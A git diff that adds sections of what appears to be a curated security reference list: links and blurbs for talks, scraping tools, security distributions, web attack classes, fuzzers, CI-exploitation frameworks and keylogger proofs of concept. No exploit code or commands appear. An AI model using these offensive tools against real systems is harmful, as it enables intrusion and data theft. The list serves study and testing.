+* [Kinetic to Digital Terrorism in the Digital Age Kyle Wilhoit](https://www.youtube.com/watch?v=IsaUuCrjXu4&index=24&list=PLNhlcxQZJSm-PKUZTYe1C94ymf0omysM3)
+* [Beyond Information Warfare: You aint seen nothing yet - Winn Scwartau](http://www.irongeek.com/i.php?page=videos/derbycon3/2206-beyond-information-warfare-you-ain-t-seen-nothing-yet-winn-schwartau)
+* [When the Cops Come A-Knocking: Handling Technical Assistance Demands from Law Enforcement](https://www.youtube.com/watch?v=PX2RjJAfTYg)
+* [New cache architecture on Intel I9 and Skylake server: An initial assessment](https://cyber.wtf/2017/07/18/new-cache-architecture-on-intel-i9-and-skylake-server-an-initial-assessment/)
+* [How They Did It: An Analysis of Emission Defeat Devices in Modern Automobiles](https://www.ieee-security.org/TC/SP2017/papers/101.pdf)
+
+#### Misc/Didn't Fit above
+
+* [NSA USB Playset - ShmooCon201](https://www.youtube.com/watch?v=eTDBFpLYcGA)
+* [Code Execution In Spite Of BitLocker](https://cryptoservices.github.io/fde/2014/12/08/code-execution-in-spite-of-bitlocker.html)
+* [Locking Your Registry Keys for Fun and, Well, Just Fun I Guess](https://tyranidslair.blogspot.co.uk/2017/07/locking-your-registry-keys-for-fun-and.html)
+* [If a prefix DROPs, does anyone listen?](http://threatshare.com/2013/05/if-a-prefix-drops-does-anyone-listen/)
+* [Exploiting Android Users for Fun and Profit](http://www.codeword.xyz/2015/08/09/exploiting-android-users-for-fun-and-profit/)
+* [Docker: Not Even a Linker](http://adamierymenko.com/docker-not-even-a-linker/)
+* [Why Qubes doesn’t work on Windows.](http://www.invisiblethingslab.com/resources/2014/A%20crack%20on%20the%20glass.pdf)
+* [A Practical Attack to De-Anonymize Social Network Users](https://www.iseclab.org/papers/sonda-TR.pdf)
+* [Virtual Ghost: Protecting Applications from Hostile Operating Systems](http://sva.cs.illinois.edu/pubs/VirtualGhost-ASPLOS-2014.pdf)
+* [moflow](https://github.com/vrtadmin/moflow)
+
+  * Release Branches for MoFlow
+
+* [List of hacker sites](http://link-base.org/)
+
+### Interesting Hardware Projects
+
+* [Digital Ding Dong Ditch](https://github.com/samyk/dingdong)
+
+  * Digital Ding Dong Ditch is a device to hack into and ring my best friend's
+    wireless doorbell whenever I send a text message to the device. The best
+    part of the device is that it causes my friend, without fail, to come
+    outside, find no one, and go back in. In this project, we'll learn not only
+    how to create this device, but how to reverse engineer radio frequencies we
+    know nothing about using RTL-SDR (a ~$14 software defined radio), as well as
+    creating hardware and software using Arduino, the Adafruit FONA (GSM/SMS/2G
+    board), an RF (radio frequency) transmitter to transmit custom signals, and
+    even how to reverse engineer a proprietary radio signal we know nothing
+    about!
+
+### Screen Scraping
+
+* [I Don’t Need No Stinking API: Web Scraping For Fun and Profit](https://blog.hartleybrody.com/web-scraping/)
+
+* [PHP Tutorial 2: Advanced Data Scraping Using cURL And XPATH](http://www.matthewwatts.net/tutorials/php-tutorial-2-advanced-data-scraping-using-curl-and-xpath/)
+
+#### Tools
+
+* [Scrapy](http://scrapy.org/)
+
+  * An open source and collaborative framework for extracting the data you need
+    from websites. In a fast, simple, yet extensible way.
+
+* [iMacros for Firefox](https://addons.mozilla.org/en-US/firefox/addon/imacros-for-firefox/)
+
+  * Automate Firefox. Record and replay repetitious work. If you love the
+    Firefox web browser, but are tired of repetitive tasks like visiting the
+    same sites every days, filling out forms, and remembering passwords, then
+    iMacros for Firefox is the solution you’ve been dreaming of! **_Whatever you
+    do with Firefox, iMacros can automate it._**
+
+* [Scraper - Chrome plugin](https://chrome.google.com/webstore/detail/scraper/mbigbapnjcgaffohmbkdlecaccepngjd)
+
+  * Scraper is a simple data mining extension for Google Chrome™ that is useful
+    for online research when you need to quickly analyze data in spreadsheet
+    form. To use it: highlight a part of the webpage you'd like to scrape,
+    right-click and choose "Scrape similar...". Anything that's similar to what
+    you highlighted will be rendered in a table ready for export, compatible
+    with Google Docs™. This is a work-in-progress (i.e. there are bugs), and is
+    currently intended for intermediate to advanced users who are comfortable
+    with XPath, though jQuery is also supported to an extent.
+
+* [IRobot](http://irobotsoft.com/)
+
+  * IRobot@IRobotSoft is an intelligent Web automation software. It features a
+    small core that powers everything you need for handling Web data. You can
+    easily teach and create your own robots to automate your daily activities.
+    The robots will click links, submit forms, connect to databases, and run
+    custom code to analyse data.
+
+* [OutWit Hub - Shareware](http://www.outwit.com/products/hub/)
+
+  * OutWit Hub breaks down Web pages into their different constituents.
+    Navigating from page to page automatically, it extracts information elements
+    and organizes them into usable collections.
+
+### Simulators/ions
+
+* [Shadow](http://shadow.github.io/)
+
+  * Summary: Shadow is a unique, open source discrete-event network simulator
+    that runs real applications like Tor. Shadow combines the accuracy of
+    emulation with the efficiency and control of simulation, achieving the best
+    of both approaches
+
+* [Hflow2](https://projects.honeynet.org/hflow)
+
+  * Data Analysis System
+
+* [VirtualPlant](http://wroot.org/projects/virtuaplant/)
+
+  * VirtuaPlant is a Industrial Control Systems simulator which adds a “similar
+    to real-world control logic” to the basic “read/write tags” feature of most
+    PLC simulators. Paired with a game library and 2d physics engine,
+    VirtuaPlant is able to present a GUI simulating the “world view” behind the
+    control system allowing the user to have a vision of the would-be actions
+    behind the control systems.strated as the fruits of the bug hunting labour.
+
+### Various Purpose Based OS's
+
+* [Parrot Security](https://www.parrotsec.org/)
+* [Qubes](https://www.qubes-os.org/wiki/)
+
+  * Qubes is an open-source operating system designed to provide strong security
+    for desktop computing using Security by Compartmentalization approach. Qubes
+    is based on Xen, the X Window System, and Linux, and can run most Linux
+    applications and utilize most of the Linux drivers. Qubes Release 1 was
+    released in September 2012 and Release 2 in September 2014. Qubes also
+    supports Windows-based AppVMs beginning with Release 2 (currently in
+    “Beta”). Qubes Release 3 is coming soon and will introduce Hypervisor
+    Abstraction Layer (HAL), allowing easy porting to alternative virtualization
+    systems.
+
+* [Liberte](http://dee.su/liberte)
+
+  * Liberté Linux is a secure, reliable, lightweight and easy to use
+    Gentoo-based LiveUSB/SD/CD Linux distribution with the primary purpose of
+    enabling anyone to communicate safely and covertly in hostile environments.
+    Whether you are a privacy advocate, a dissident, or a sleeper agent, you are
+    equally likely to find Liberté Linux useful as a mission-critical
+    communication aid.
+
+* [Archassault](https://archassault.org/)
+
+  * The ArchAssault Project is an Arch Linux derivative for penetration testers,
+    security professionals and all-around Linux enthusiasts. This means we
+    import the vast majority of the official upstream Arch Linux packages, these
+    packages are unmodified from their upstream source. While our Arch Linux
+    base is primarily untouched, there are times were we have to fork a package
+    to be able to better support our vast selection of tools. All of our
+    packages strive to maintain the Arch Linux standards, methods and
+    philosophies.
+
+* [Kali linux](https://www.kali.org/)
+
+  * You do pentesting with it.
+
+* [Tails](https://tails.boum.org/)
+
+  * Tails is a live operating system, that you can start on almost any computer
+    from a DVD, USB stick, or SD card. It aims at preserving your privacy and
+    anonymity, and helps you to: use the Internet anonymously and circumvent
+    censorship; all connections to the Internet are forced to go through the Tor
+    network; leave no trace on the computer you are using unless you ask it
+    explicitly; use state-of-the-art cryptographic tools to encrypt your files,
+    emails and instant messaging.
+
+* [PenQ](http://www.qburst.com/products/PenQ)
+
+  * PenQ is an open source, Linux-based penetration testing browser bundle we
+    built over Mozilla Firefox. It comes pre-configured with security tools for
+    spidering, advanced web searching, fingerprinting, anonymous browsing, web
+    server scanning, fuzzing, report generating and more.
+
+* [Active Defense Harbinger Distribution (ADHD)](https://www.sourceforge.net/projects/adhd/)
+
+  * The Active Defense Harbinger Distribution (ADHD) is a Linux distro based on
+    Ubuntu LTS. It comes with many tools aimed at active defense preinstalled
+    and configured. The purpose of this distribution is to aid defenders by
+    giving them tools to "strike back" at the bad guys. ADHD has tools whose
+    functions range from interfering with the attackers' reconnaissance to
+    compromising the attackers' systems. Innocent bystanders will never notice
+    anything out of the ordinary as the active defense mechanisms are triggered
+    by malicious activity such as network scanning or connecting to restricted
+    services.
+  * [Blogpost going over it/setting it up - HolisticInfosec](http://holisticinfosec.blogspot.com/2013/10/c3cm-part-3-adhd-active-defense.html)
+
+### Interesting Software
+
+#### Generally interesting
+
+* [scanless](https://github.com/vesche/scanless)
+
+  * Command-line utility for using websites that can perform port scans on your
+    behalf. Useful for early stages of a penetration test or if you'd like to
+    run a port scan on a host and have it not come from your IP address.
+
+* [Simplevisor](https://ionescu007.github.io/SimpleVisor/)
+
+  * SimpleVisor is a simple, portable, Intel VT-x hypervisor with two specific
+    goals: using the least amount of assembly code (10 lines), and having the
+    smallest amount of VMX-related code to support dynamic hyperjacking and
+    unhyperjacking (that is, virtualizing the host state from within the host).
+    It runs on both Windows and UEFI.
+
+#### Data Visualization
+
+* [ProcDOT](http://www.cert.at/downloads/software/procdot_en.html)
+
+  * This tool processes Sysinternals Process Monitor (Procmon) logfiles and
+    PCAP-logs (Windump, Tcpdump) to generate a graph via the GraphViz suite.
+    This graph visualizes any relevant activities (customizable) and can be
+    interactively analyzed.
+
+#### Local
+
+* [Foreign LINUX](https://github.com/wishstudio/flinux)
+
+  * Foreign LINUX is a dynamic binary translator and a Linux system call
+    interface emulator for the Windows platform. It is capable of running
+    unmodified Linux binaries on Windows without any drivers or modifications to
+    the system. This provides another way of running Linux applications under
+    Windows in constrast to Cygwin and other tools.
+
+#### Network
+
+* [Netdude](http://netdude.sourceforge.net/)
+
+  * The Network Dump data Displayer and Editor is a framework for inspection,
+    analysis and manipulation of tcpdump trace files. It addresses the need for
+    a toolset that allows easy inspection, modification, and creation of
+    pcap/tcpdump trace files. Netdude builds on any popular UNIX-like OS, such
+    as Linux, the BSDs, or OSX.
+
+#### Programming Related
+
+* [Hachoir](https://bitbucket.org/haypo/hachoir/wiki/Home)
+
+  * Hachoir is a Python library that allows to view and edit a binary stream
+    field by field
+
+* [pdf-bot](https://github.com/esbenp/pdf-bot)
+
+  * ?? A Node queue API for generating PDFs using headless Chrome. Comes with a
+    CLI, S3 storage and webhooks for notifying subscribers about generated PDFs
+
+* [exitmap](https://github.com/NullHypothesis/exitmap)
+
+  * A fast and modular scanner for Tor exit relays.
+
+* [SniffJoke](https://github.com/vecna/sniffjoke)
+
+  * SniffJoke is an application for Linux that handle transparently your TCP
+    connection, delaying, modifyng and inject fake packets inside your
+    transmission, make them almost impossible to be correctly readed by a
+    passive wiretapping technology (IDS or sniffer)
+
+* [Unicorn-Engine](http://www.unicorn-engine.org/)
+
+  * Unicorn is a lightweight multi-platform, multi-architecture CPU emulator
+    framework.
+
+* [Distributed File Storage Using JavaScript Botnets](https://github.com/seantmalone/HiveMind)
+
+#### Other
+
+* [ZeroMQ](http://zguide.zeromq.org/page:all)
+* [recap](https://github.com/rackerlabs/recap)
+
+  * recap is a reporting script that generates reports of various information
+    about the server.
+
+* [LuxBase](https://github.com/kienankb/LuxBase)
+* [Delta Copy](http://www.aboutmyip.com/AboutMyXApp/DeltaCopy.jsp)
+
+  * In technical terms, DeltaCopy is a "Windows Friendly" wrapper around the
+    Rsync program, currently maintained by Wayne Davison. "rsync" is primarily
+    designed for Unix/Linux/BSD systems. Although ports are available for
+    Windows, they typically require downloading Cygwin libraries and manual
+    configuration.
+
+* [autojump - a faster way to navigate your filesystem](https://github.com/wting/autojump)
+
+  * autojump is a faster way to navigate your filesystem. It works by
+    maintaining a database of the directories you use the most from the command
+    line.
+
+* [Universal Extractor](http://www.legroom.net/software/uniextract)
+
+  * Universal Extractor is a program designed to decompress and extract files
+    from any type of archive or installer, such as ZIP or RAR files,
+    self-extracting EXE files, application installers, etc
+
+#### Personal Utilities
+
+* [CyberChef - GCHQ](https://github.com/gchq/CyberChef)
+
+  * CyberChef is a simple, intuitive web app for carrying out all manner of
+    "cyber" operations within a web browser. These operations include simple
+    encoding like XOR or Base64, more complex encryption like AES, DES and
+    Blowfish, creating binary and hexdumps, compression and decompression of
+    data, calculating hashes and checksums, IPv6 and X.509 parsing, changing
+    character encodings, and much more.
+
+* [WizTree](http://www.majorgeeks.com/files/details/wiztree.html)
+
+  * WizTree is a disk space analyzer that will quickly scan your entire hard
+    drive and shows you which files and folders are using the most disk space.
+    WizTree obtains information by directly scanning the MFT file, so it can
+    only work with local (directly attached) drives formatted with the NTFS file
+    system. It won't work with network drives, substituted drives or non-NTFS
+    formatted drives. We may add support for other drive types in the future if
+    there's enough demand.
+
+* [Xmount](https://www.pinguin.lu/xmount)
+
+  * What is xmount? xmount allows you to convert on-the-fly between multiple
+    input and output harddisk image types. xmount creates a virtual file system
+    using FUSE (Filesystem in Userspace) that contains a virtual representation
+    of the input image. The virtual representation can be in raw DD, DMG, VHD,
+    VirtualBox's virtual disk file format or in VmWare's VMDK file format. Input
+    images can be raw DD, EWF (Expert Witness Compression Format) or AFF
+    (Advanced Forensic Format) files. In addition, xmount also supports virtual
+    write access to the output files that is redirected to a cache file. This
+    makes it possible to boot acquired harddisk images using QEMU, KVM,
+    VirtualBox, VmWare or alike.
+
+* [HashID](https://github.com/psypanda/hashID)
+
+  * hashID is a tool written in Python 3 which supports the identification of
+    over 220 unique hash types using regular expressions. It is able to identify
+    a single hash, parse a file or read multiple files in a directory and
+    identify the hashes within them. hashID is also capable of including the
+    corresponding hashcat mode and/or JohnTheRipper format in its output. hashID
+    works out of the box with Python 2 = 2.7.x or Python 3 = 3.3 on any
+    platform.
+
+* [gibbersense](https://github.com/smxlabs/gibbersense)
+
+  * Extract Sense out of Gibberish stuff
+
+* [algo](https://github.com/trailofbits/algo)
+
+  * 1-click IPSEC VPN in the Cloud
+
+* [cyberfree](https://github.com/arnaudsoullie/cyberfree)
+
+  * Cyber-free browsing extension for Chrome
+
+#### Editors
+
+* [wxHex Editor](http://www.wxhexeditor.org/home.php)
+
+  * wxHexEditor is another Free Hex Editor, build because there is no good hex
+    editor for Linux system, specially for big files.
+
+#### GPU Keylogger
+
+* [Demon](https://github.com/x0r1/Demon)
+
+  * GPU keylogger PoC by Team Jellyfish
+
+* FreeIPA
+
+  * FreeIPA is an integrated security information management solution combining
+    Linux (Fedora), 389 Directory Server, MIT Kerberos, NTP, DNS, Dogtag
+    (Certificate System). It consists of a web interface and command-line
+    administration tools. FreeIPA is an integrated Identity and Authentication
+    solution for Linux/UNIX networked environments. A FreeIPA server provides
+    centralized authentication, authorization and account information by storing
+    data about user, groups, hosts and other objects necessary to manage the
+    security aspects of a network of computers.
+
+#### Scraping/Archiving
+
+* [wikiteam](https://github.com/WikiTeam/wikiteam)
+
+  * Tools for downloading and preserving wikis
+
+* [Paste-Scraper](https://github.com/KernelEquinox/Paste-Scraper)
+* [Wayback scraper](https://github.com/abrenaut/waybackscraper)
+* [Webrecorder](https://webrecorder.io/)
+
+  * Create high-fidelity, interactive web archives of any web site you browse
diff --git a/source/Web-And-Browsers.md b/source/Web-And-Browsers.md
new file mode 100644
index 0000000..5994aed
--- /dev/null
+++ b/source/Web-And-Browsers.md
@@ -0,0 +1,1754 @@
+# Web, Web Applications & Browsers
+
+### TOC
+
+* [General](#general)
+* [Purposely Vulnerable Web Apps](#pvuln)
+* [Securing Web Applications Checklists](#checklist)
+* [Talks & Presentations](#talks)
+* [General Tools](#generalt)
+* [Different Typs of Web Based Attacks](#difatk)
+  * [Abuse of Functionality](#abuse)
+  * [Brute Force Fuzzing](#brute)
+  * [Attacking Continous Integration Systems](#ci)
+  * [Cross-Site-Request Forgery](#csrf)
+  * [De/Encoders](#encode)
+  * [Data Structure Attacks](#dsa)
+  * [Embedded Malicious Code](#emc)
+  * [Exploitation of Authentication](#eoa)
+  * [Injection Based Attacks](#ija)
+    * OS Command Injection
+    * (NO)SQL Injection
+  * [JNDI](#jndi)
+  * [Java Serialization Attacks](#jsa)
+  * [JSON Web Tokens](#jwt)
+  * [LFI & RFI](#lrfi)
+  * [Path Traversal Attacks](#pta)
+  * [Server Side Request Forgery](#ssrf)
+  * [Server Side Include](#ssi)
+  * [Server Side Template Injection](#ssti)
+  * [Timing Attacks](#timing)
+  * [Web Shells](#shells)
+  * [XSS](#xss)
+* [API Stuff](#api)
+* [Attacking Browsers](#atkb)
+* [CMS Specific Tools](#cms)
+* [HTML5](#html5)
+* [Javascript](#javascript)
+* [REST & Web Services](#rest)
+* [PHP](#php)
+* [Ruby](#ruby)
+* [Scraping](#scraping)
+* [Site/WebApp Scanners](#scanners)
+* [Web Sockets](#websocket)
+* [Web Proxies](#webproxy)
+* [Web Application Firewalls(WAFs)](#waf)
+  * [Bypassing WAFs](#bwaf)
+* [Web Application Attack Writeups](#writeups)
+* [Non-Attack Writeups](#nonwriteup)
+* [Papers](#papers)
+* [Miscellaneous](#misc)
+* [Burp Stuff/Plugins](#burp)
+* [AWS stuff](#aws)
+* [Google Compute Cloud/AppEngine](#gcc)
+
+#### To-do
+
+* Fix ToC
+* Add CSP -
+  [Intro to content Security Policy](http://www.html5rocks.com/en/tutorials/security/content-security-policy/)
+* Add SOAP
+* Clickjack(ing)
+* [Postcards from a Post-XSS World - Michael Zalewski](http://lcamtuf.coredump.cx/postxss/#dangling-markup-injection)
+
+  * This page is a rough collection of notes on some of the fundamental
+    alternatives to direct script injection that would be available to attackers
+    following the universal deployment of CSP or other security mechanisms
+    designed to prevent the execution of unauthorized scripts. I hope to
+    demonstrate that in many cases, the capabilities offered by these
+    alternative methods are highly compatible with the goals of contemporary XSS
+    attacks.
+
+* http://console-cowboys.blogspot.com/2011/05/web-hacking-video-series-1-automating.html
+* https://blog.netspi.com/sql-server-persistence-part-1-startup-stored-procedures/
+
+### General
+
+* Cheat Sheets
+
+* [Attack Surface Analysis Cheat Sheet](https://www.owasp.org/index.php/Attack_Surface_Analysis_Cheat_Sheet)
+
+* Documentation
+
+* [DOM - Standard](https://dom.spec.whatwg.org/)
+* [DOM Living Standard](https://dom.spec.whatwg.org/)
+* [HTML 5 Standards](http://w3c.github.io/html/)
+* [Transport Layer Security (TLS) Extensions](https://www.iana.org/assignments/tls-extensiontype-values/tls-extensiontype-values.xhtml)
+* [Web IDL Standards](https://heycam.github.io/webidl/)
+* [Object MetaInformation](https://www.w3.org/Protocols/HTTP/Object_Headers.html#public)
+
+  * Educational
+
+* [The Tale of a Fameless but Widespread Web Vulnerability Class - Veit Hailperin](https://www.youtube.com/watch?v=5qA0CtS6cZ4)
+
+  * Two keys components account for finding vulnerabilities of a certain class:
+    awareness of the vulnerability and ease of finding the vulnerability.
+    Cross-Site Script Inclusion (XSSI) vulnerabilities are not mentioned in the
+    de facto standard for public attention - the OWASP Top 10. Additionally
+    there is no public tool available to facilitate finding XSSI. The impact
+    reaches from leaking personal information stored, circumvention of
+    token-based protection to complete compromise of accounts. XSSI
+    vulnerabilities are fairly wide spread and the lack of detection increases
+    the risk of each XSSI. In this talk we are going to demonstrate how to find
+    XSSI, exploit XSSI and also how to protect against XSSI.
+
+* [Discover DevTools](https://www.codeschool.com/courses/discover-devtools)
+
+  * Learn how Chrome DevTools can sharpen your dev process and discover the
+    tools that can optimize your workflow and make life easier.
+
+* General
+
+* [OWASP Top Ten Project](https://www.owasp.org/index.php/Category:OWASP_Top_Ten_Project)
+
+  * The OWASP Top 10 is a powerful awareness document for web application
+    security. It represents a broad consensus about the most critical security
+    risks to web applications. Project members include a variety of security
+    experts from around the world who have shared their expertise to produce
+    this list.
+
+* [JSFuck](http://www.jsfuck.com/)
+
+  * JSFuck is an esoteric and educational programming style based on the atomic
+    parts of JavaScript. It uses only six different characters to write and
+    execute code.
+
+* [How to Obscure Any URL](http://www.pc-help.org/obscure.htm)
+* [HTTP Evasion](http://noxxi.de/research/http-evader-explained-8-borderline-robustness.html)
+* [Big List of Naughty Strings](https://github.com/minimaxir/big-list-of-naughty-strings)
+
+  * The Big List of Naughty Strings is an evolving list of strings which have a
+    high probability of causing issues when used as user-input data. This is
+    intended for use in helping both automated and manual QA testing; useful for
+    whenever your QA engineer walks into a bar.
+
+* Interesting Attacks that don't fit elsewhere
+
+* [Abusing Certificate Transparency Or How To Hack Web Applications BEfore Installation - Hanno Bock](https://media.defcon.org/DEF%20CON%2025/DEF%20CON%2025%20presentations/DEFCON-25-Hanno-Boeck-Abusing-Certificate-Transparency-Logs.pdf)
+
+### Purposely Vulnerable Web Applications/Testing Grounds
+
+* [OWASP Vulnerable Web Applications Directory Project/Pages/Offline](https://www.owasp.org/index.php/OWASP_Vulnerable_Web_Applications_Directory_Project/Pages/Offline)
+* [OWASP Juice Shop](https://github.com/bkimminich/juice-shop)
+
+  * OWASP Juice Shop is an intentionally insecure web application written
+    entirely in Javascript which encompasses the entire range of OWASP Top Ten
+    and other severe security flaws.
+
+* [Pwning OWASP Juice Shop](https://leanpub.com/juice-shop)
+* [Hackazon](https://github.com/rapid7/hackazon)
+
+  * Hackazon is a free, vulnerable test site that is an online storefront built
+    with the same technologies used in today’s rich client and mobile
+    applications. Hackazon has an AJAX interface, strict workflows and RESTful
+    API’s used by a companion mobile app providing uniquely-effective training
+    and testing ground for IT security professionals. And, it’s full of your
+    favorite vulnerabilities like SQL Injection, cross-site scripting and so on.
+
+### Securing Web Applications/Checklists
+
+* Attacking
+
+* [OWASP Testing Checklist](https://www.owasp.org/index.php/Testing_Checklist)
+* [WebAppSec Testing Checklist](http://tuppad.com/blog/wp-content/uploads/2012/03/WebApp_Sec_Testing_Checklist.pdf)
+* [OWASP Web Application Security Testing Cheat Sheet](https://www.owasp.org/index.php/Web_Application_Security_Testing_Cheat_Sheet)
+
+* Securing
+
+* [Center for Internet Security Apache Server 2.4 Hardening Guide](https://benchmarks.cisecurity.org/tools2/apache/CIS_Apache_HTTP_Server_2.4_Benchmark_v1.1.0.pdf)
+* [Securing Web Application Technologies Checklist](http://www.securingthehuman.org/developer/swat)
+* [Wordpress Security Guide - WPBeginner](http://www.wpbeginner.com/wordpress-security/)
+* [API Security Checklist](https://github.com/shieldfy/API-Security-Checklist/blob/master/README.md)
+* [Magical Code Injection Rainbow Framework](https://github.com/SpiderLabs/MCIR)
+
+  * The Magical Code Injection Rainbow! MCIR is a framework for building
+    configurable vulnerability testbeds. MCIR is also a collection of
+    configurable vulnerability testbeds. Has testing lessons for xss/csrf/sql
+
+### Talks & Presentations
+
+* [The Website Obesity Crisis](http://idlewords.com/talks/website_obesity.htm)
+* [Attacking Modern SaaS Companies](https://github.com/cxxr/talks/blob/master/2017/nolacon/Attacking%20Modern%20SaaS%20Companies%20%E2%80%93%20NolaCon.pdf) \*
+  [Presentation](https://www.youtube.com/watch?v=J0otoKRh1Vk&app=desktop)
+* [The AppSec Starter Kit Timothy De Block](https://www.youtube.com/watch?v=KMz8lWNAUmg)
+* [Server-side browsing considered harmful](http://www.agarri.fr/docs/AppSecEU15-Server_side_browsing_considered_harmful.pdf)
+* [Backslash Powered Scanning: Hunting Unknown Vulnerability Classes](http://blog.portswigger.net/2016/11/backslash-powered-scanning-hunting.html)
+
+  * Existing web scanners search for server-side injection vulnerabilities by
+    throwing a canned list of technology-specific payloads at a target and
+    looking for signatures - almost like an anti-virus. In this document, I'll
+    share the conception and development of an alternative approach, capable of
+    finding and confirming both known and unknown classes of injection
+    vulnerabilities. Evolved from classic manual techniques, this approach reaps
+    many of the benefits of manual testing including casual WAF evasion, a tiny
+    network footprint, and flexibility in the face of input filtering.
+
+* [Web Application testing approach and cheating to win Jim McMurry Lee Neely Chelle Clements - Derbycon7](https://www.youtube.com/watch?v=Z8ZAv_EN-9M)
+* [DOM Based Angular Sandbox Escapes by Gareth Heyes - BSides Manchester2017](https://www.youtube.com/watch?v=jlSI5aVTEIg&index=16&list=PLcgqQkap1lNrOBNCXqpPqpPAqckxv0XhP)
+* [AWSBucketDump](https://github.com/jordanpotti/AWSBucketDump)
+
+  * Security Tool to Look For Interesting Files in S3 Buckets
+
+### General Tools
+
+* Site Imaging/Taking Pictures
+
+* [PowerWebShot](https://github.com/dafthack/PowerWebShot)
+  * A PowerShell tool for taking screenshots of multiple web servers quickly.
+* [HTTrack - Website Copier](https://www.httrack.com/)
+
+  * It allows you to download a World Wide Web site from the Internet to a local
+    directory, building recursively all directories, getting HTML, images, and
+    other files from the server to your computer. HTTrack arranges the original
+    site's relative link-structure. Simply open a page of the "mirrored" website
+    in your browser, and you can browse the site from link to link, as if you
+    were viewing it online. HTTrack can also update an existing mirrored site,
+    and resume interrupted downloads. HTTrack is fully configurable, and has an
+    integrated help system.
+
+* [Kraken - Web Interface Survey Tool](https://github.com/Sw4mpf0x/Kraken)
+* [Blogpost](https://pentestarmoury.com/2017/01/31/kraken-web-interface-survey-tool/)
+
+- General
+
+- [HTTPie - curl for humans](https://gith*ub.com/jakubroztocil/httpie)
+  * HTTPie (pronounced aych-tee-tee-pie) is a command line HTTP client. Its goal
+    is to make CLI interaction with web services as human-friendly as possible.
+    It provides a simple http command that allows for sending arbitrary HTTP
+    requests using a simple and natural syntax, and displays colorized output.
+    HTTPie can be used for testing, debugging, and generally interacting with
+    HTTP servers.
+- [leaps - shared text editing in Golang](https://github.com/denji/leaps)
+  * Leaps is a service for hosting collaboratively edited documents using
+    operational transforms to ensure zero-collision synchronization across any
+    number of editing clients.
+- [OWASP Mantra](http://www.getmantra.com/hackery/)
+  * “OWASP Mantra is a powerful set of tools to make the attacker's task easier”
+- [dvcs-ripper](https://github.com/kost/dvcs-ripper)
+  * Rip web accessible (distributed) version control systems: SVN, GIT,
+    Mercurial/hg, bzr, ... It can rip repositories even when directory browsing
+    is turned off.
+- [Caja](https://developers.google.com/caja/)
+
+  * The Caja Compiler is a tool for making third party HTML, CSS and JavaScript
+    safe to embed in your website. It enables rich interaction between the
+    embedding page and the embedded applications. Caja uses an object-capability
+    security model to allow for a wide range of flexible security policies, so
+    that your website can effectively control what embedded third party code can
+    do with user data.
+
+- [Home-Assistant](https://home-assistant.io/)
+
+  * Open Source home automation platform
+
+- [HTTPLeaks](https://github.com/cure53/HTTPLeaks)
+  * HTTPLeaks - All possible ways, a website can leak HTTP requests
+- [SSleuth](https://github.com/sibiantony/ssleuth)
+  * A firefox add-on to rate the quality of HTTPS connections
+- JS-based scanning
+
+- [lan-js](https://github.com/jvennix-r7/lan-js)
+  * Probe LAN devices from a web browser.
+- [sonar.js](https://thehackerblog.com/sonar-a-framework-for-scanning-and-exploiting-internal-hosts-with-a-webpage/)
+  * A Framework for Scanning and Exploiting Internal Hosts With a Webpage
+- Recon
+
+- [hackability](https://github.com/PortSwigger/hackability)
+  * Rendering Engine Hackability Probe performs a variety of tests to discover
+    what the unknown rendering engine supports. To use it simply extract it to
+    your web server and visit the url in the rendering engine you want to test.
+    The more successful probes you get the more likely the target engine is
+    vulnerable to attack.
+- [WhatWeb](https://github.com/urbanadventurer/WhatWeb)
+- [Tachyon](https://github.com/delvelabs/tachyon)
+  * Tachyon is a Fast Multi-Threaded Web Discovery Tool
+- [dirsearch](https://github.com/maurosoria/dirsearch)
+  * dirsearch is a simple command line tool designed to brute force directories
+    and files in websites.
+- Scanner
+
+- General
+
+- [HTCAP](https://github.com/segment-srl/htcap)
+  * htcap is a web application scanner able to crawl single page application
+    (SPA) in a recursive manner by intercepting ajax calls and DOM changes
+- [gethead](https://github.com/httphacker/gethead)
+
+  * HTTP Header Analysis Vulnerability Tool
+
+- Virtual Hosts/VHOSTs
+
+  * [virtual-host-discovery](https://github.com/jobertabma/virtual-host-discovery)
+
+    * This is a basic HTTP scanner that'll enumerate virtual hosts on a given IP
+      address. During recon, this might help expand the target by detecting old
+      or deprecated code. It may also reveal hidden hosts that are statically
+      mapped in the developer's /etc/hosts file.
+
+## Different Types of Web Based Attacks
+
+* As seen on
+  [OWASP Attack List](https://www.owasp.org/index.php/Category:Attack)
+
+##### Abuse of Functionality
+
+* [jsgifkeylogger](https://github.com/wopot/jsgifkeylogger)
+
+  * a javascript keylogger included in a gif file This is a PoC
+
+### Brute Force/Fuzzing
+
+* [Dirbuster](https://www.owasp.org/index.php/Category:OWASP_DirBuster_Project)
+
+  * DirBuster is a multi threaded java application designed to brute force
+    directories and files names on web/application servers. Often is the case
+    now of what looks like a web server in a state of default installation is
+    actually not, and has pages and applications hidden within. DirBuster
+    attempts to find these.
+
+* [Go Buster](https://github.com/OJ/gobuster)
+
+  * Directory/file busting tool written in Go
+  * Recursive, CLI-based, no java runtime
+
+* [WFuzz](https://code.google.com/p/wfuzz/)
+
+  * Wfuzz is a tool designed for bruteforcing Web Applications, it can be used
+    for finding resources not linked (directories, servlets, scripts, etc),
+    bruteforce GET and POST parameters for checking different kind of injections
+    (SQL, XSS, LDAP,etc), bruteforce Forms parameters (User/Password),
+    Fuzzing,etc
+
+* [dirsearch](https://github.com/maurosoria/dirsearch)
+
+  * dirsearch is a simple command line tool designed to brute force directories
+    and files in websites.
+
+* [Tachyon](https://github.com/delvelabs/tachyon)
+
+  * Tachyon is a Fast Multi-Threaded Web Discovery Tool
+
+### Attacking Continous Integration Systems
+
+* [cider - Continuous Integration and Deployment Exploiter](https://github.com/spaceB0x/cider)
+
+  * CIDER is a framework written in node js that aims to harness the functions
+    necessary for exploiting Continuous Integration (CI) systems and their
+    related infrastructure and build chain (eg. Travis-CI, Drone, Circle-CI).
+    Most of the exploits in CIDER exploit CI build systems through open GitHub
+    repositories via malicious Pull Requests. It is built modularly to encourage
+    contributions, so more exploits, attack surfaces, and build chain services
+    will be integrated in the future.
+
+* [Rotten Apple](https://github.com/claudijd/rotten_apple)
+
+  * A tool for testing continuous integration (CI) or continuous delivery (CD)
+    system security
+
+* [Exploiting Continuous Integration (CI) and Automated Build Systems - spaceb0x](https://media.defcon.org/DEF%20CON%2025/DEF%20CON%2025%20presentations/DEFCON-25-spaceB0x-Exploiting-Continuous-Integration.pdf)
+
+#### Cross Site Request Forgery (CSRF)
+
+* [Cross Site Request Forgery](https://www.owasp.org/index.php/Cross-Site_Request_Forgery_%28CSRF%29)
+
+#### De/Encoders
+
+* [Unphp.net php decoder](http://www.unphp.net/decode/)
